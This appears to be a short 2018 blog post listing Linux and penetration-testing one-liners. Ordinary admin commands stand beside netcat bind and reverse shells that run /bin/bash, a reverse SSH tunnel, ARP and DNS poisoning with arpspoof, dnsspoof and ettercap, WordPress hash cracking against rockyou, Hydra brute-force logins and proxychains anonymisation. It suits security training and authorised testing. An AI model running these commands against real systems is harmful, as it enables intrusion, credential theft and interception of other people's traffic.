---
layout: post
title:  "Some utils commands and tools for Linux"
date:   2018-11-16 23:46:00 -0300
categories: tutorial linux hacker
---
This is a list of some utils command for linux and pentest:
``` 
# Start webserver
service apache2 start

# See all opened port
netstat -nlpt

# See logs apache
tail -f /var/log/apache2/access.log

# Navigate using cli
curl 192.168.1.1

# Conecting to a TCP port
nc -v site.com 80

# Listen a TCP port
# Need use package netcat-traditional
nc -nlp 6000 -e /bin/bash

# Reverse Conection to TCP port
nc -vnlp 443 # On Your machine
nc 192.168.1.10 443 -e /bin/bash # On your remote machine

# Running Python with module
python -m SimpleHTTPServer 80

# BurpSuite is a proxy intercept for HTTP

# See information about owner
whois site.com

# List dns names of site
dnsenum --enum site.com
fierce -dns site.com

# resolve dns name to IP
host www.site.com
host -t ns site.com

# Transfer zone of dns
host -l site.com primarydns.site.com

# Port scan
nmap -v -sS -Pn 192.168.1.1 172.0.0.1

# HTTP URL Scan
dirb http://site.com/
dirb http://site.com/ /usr/share/dirb/wordlists/small.txt

# HTTP Scanner of Vulnerabilities
nikto -h http://site.com

# Wordpress Scanner of Vulnerabilities
wpscan --url anwpsite.com
wpscan --url anwpsite.com --enumerate ap
wpscan --url anwpsite.com --enumerate t

# Hash Identifier
hash-identifier 

# Crack of Hash key to Wordpress
hashcat -m 400 hashfilewithkey /usr/share/wordlists/rockyou.txt
john --list=formats
john --format=phpass --wordlist /usr/share/wordlists/rockyou.txt hashfilewithkey

# Get interactive shell with python
python -c 'import pty; pty.spawn("/bin/bash")'

#Login in mySQL
mysql -uroot -p

# Compile C code to x86 in x64 enviroment
gcc -m32 yourcode.c -o yourcode -pthread

# See rules of Firewall
iptables -nL

# Tunnel SSH for reverse conection
ssh -fN 443:localhost:22 root@myvpsserver

# Syncronize remote folders
rsync -Cravzp /path/of/origin user@remotemachine:/path/of/destiny

# to ping several hosts
fping -c1 -g 192.168.1.0 192.168.1.255

# Avoid ICMP packages
iptables -A INPUT -p icmp --icmp-type 8 -d 192.168.1.0/24 -j DROP

# Mount packages TCP/IP
hping3 --fin --syn --rst --ack --urg -c 4 -p 80 192.168.1.1

# Fingerprint
xprobe2 -A -T 80 site.com
amap 192.168.1.16 80

# Joomla Scanner of Vulnerabilities
joomscan -u htttp://site.com

# Show ARP Table
arp -a

# ARP Poisoning Attack
arpspoof -i eth0 -t 192.168.0.28 -r 192.168.0.13

# Enable Global Routing
echo 1 > /proc/sys/net/ipv4/ip_forward

# DNS Poisoning Attack
dnsspoof -i eth0

# Ettercap Tooltik Attack
ettercap -G
ettercap -Tq -i eth0 -M arp /192.168.0.1// /192.168.0.2-254//
ettercap -q -T -i eth0 -M arp -P dns_spoof ///

# Generate a wordlists
crunch 6 8 abcd123
cewl site.com -m 4
./cupp.py -i

# Using bruteforce
hydra -L loginlist.txt -P passlist.txt 192.168.0.1 ftp
hydra -l root -p password site.com http-get /path/
hydra -l admin -x 2:2:a site.com http-form "path.php:login=^USER^&pw=^PASS^:Deny"

# Circuit of proxies for anonymity
proxychains firefox
proxychains nmap

```
